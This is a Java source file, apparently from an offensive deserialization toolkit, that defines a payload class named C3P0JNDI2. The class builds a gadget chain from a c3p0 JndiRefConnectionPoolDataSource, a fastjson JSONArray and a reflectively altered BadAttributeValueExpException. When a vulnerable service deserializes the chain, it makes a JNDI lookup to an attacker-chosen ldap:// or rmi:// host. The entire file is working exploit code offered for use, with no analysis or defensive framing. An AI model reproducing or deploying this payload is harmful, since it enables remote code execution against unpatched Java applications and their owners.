package com.qi4l.JYso.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.alibaba.fastjson:com.alibaba.fastjson1.X"})
@Authors({Authors.Unam4})
public class C3P0JNDI2 implements  ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        if (command.toLowerCase().startsWith("jndi:")) {
            command = command.substring(5);
        }

        if (!command.toLowerCase().startsWith("ldap://") && !command.toLowerCase().startsWith("rmi://")) {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }

        JndiRefConnectionPoolDataSource o = new JndiRefConnectionPoolDataSource();
        o.setJndiName(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o);

        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(o, val);
        return hashMap;
    }
}
